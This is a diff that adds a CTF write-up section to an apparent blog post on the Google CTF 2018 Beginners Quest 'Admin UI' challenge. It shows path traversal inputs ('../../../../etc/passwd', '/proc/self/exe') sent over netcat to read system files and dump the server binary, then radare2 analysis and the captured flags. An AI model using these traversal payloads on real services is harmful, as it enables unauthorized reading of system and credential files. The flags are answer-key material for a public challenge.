@@ -1329,3 +1329,174 @@ Within the management console, we will find credentials that can be exposed by v
 <br>
 ### Solution
 <b>CTF{Kao4pheitot7Ahmu}</b>
+
+
+<br>
+<br>
+## Admin UI - pwn-re
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/59.png" alt="" class="center">
+<br>
+<br>
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/60.png" alt="" class="center">
+
+This time, our challenge wants us to poke at the mysterious management interface through a netcat connection on port 1337. When we connect to the interface, our console shows a menu. It might be tempting to start fuzzing the input to see what kind of crashes we can cause, but it's always worthwhile to try the basic commands first to get an of the functions behind each option.
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/61.png" alt="" class="center">
+
+```bash
+root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+1
+Please enter the backdoo^Wservice password:
+123456  
+Incorrect, the authorities have been informed!
+root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+2
+The following patchnotes were found:
+ - Version0.2
+ - Version0.3
+Which patchnotes should be shown?
+1
+Error: No such file or directory
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+```
+
+When we try to access the first patchnotes document displayed by the console, using "1" as input, we get a suspicious response -- "Error: No such file or directory." The output resembles what the terminal might send back if we try to <code>cat</code> a nonexistent file. 
+
+```bash
+root@kali:~/google-ctf-2018/admin-ui# cat missing-file
+cat: missing-file: No such file or directory
+```
+
+Let's test for local file inclusion using <b>/etc/passwd</b>
+
+
+```
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+2
+The following patchnotes were found:
+ - Version0.2
+ - Version0.3
+Which patchnotes should be shown?
+../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+user:x:1337:1337::/home/user:
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+```
+
+Looks like we have local file inclusion in the application. When we check <b>/self/proc/exe</b> for the executable being run by the current pid, we get some binary output. 
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/62.png" alt="" class="center">
+
+If we can redirect the output to a file on our machine, we may be able to debug the binary to figure out what's going on under the hood. Before we do, we have to clean up the file contents using <code>hexeditor -b</code> since the menu was appended to the beginning.
+
+```bash
+root@kali:~/google-ctf-2018/admin-ui# echo -e "2\n../../../../../../proc/self/exe" | nc mngmnt-iface.ctfcompetition.com 1337 > main
+^C
+
+root@kali:~/google-ctf-2018/admin-ui# file main
+main: data
+
+root@kali:~/google-ctf-2018/admin-ui# hexeditor -b main 
+```
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/63.png" alt="" class="center">
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/64.png" alt="" class="center">
+
+We can delete all the bytes before the ELF magic number <b>0x7F 0x45 0x4C 0x46</b> or <b>0x7F 'E' 'L' 'F'</b> on line <b>B0</b>.
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/65.png" alt="" class="center">
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/66.png" alt="" class="center">
+
+Doing this converts our <b>main</b> file to a proper executable. 
+
+```bash
+root@kali:~/google-ctf-2018/admin-ui# file main 
+main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e78c178ffb1ddc700123dbda1a49a695fafd6c84, with debug_info, not stripped
+
+```
+
+Notice we have <b>debug_info</b> available. Using <b>radare2</b>, we can examine <b>main</b> in detail using the <code>vv</code> option.
+
+```bash
+root@kali:~/google-ctf-2018/admin-ui# r2 main 
+[0x41414150]> aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
+[0x41414150]> vv
+```
+
+Here we get a list of symbols that include the functions within our executable. If we examine the code in <b>primary_login__</b>, we'll find <b>obj.FLAG_FILE</b> corresponds to simply, <b>flag</b>.
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/67.png" alt="" class="center">
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/68.png" alt="" class="center">
+
+If we reconnect back to the management interface and check the directory serving patchnotes for a file named <b>flag</b>, we successfully print the contents of our flag to console.
+
+```bash
+root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+2
+The following patchnotes were found:
+ - Version0.2
+ - Version0.3
+Which patchnotes should be shown?
+../flag
+CTF{I_luv_buggy_sOFtware}=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+```
+
+<br>
+<br>
+### Solution
+<b>CTF{I_luv_buggy_sOFtware}</b>
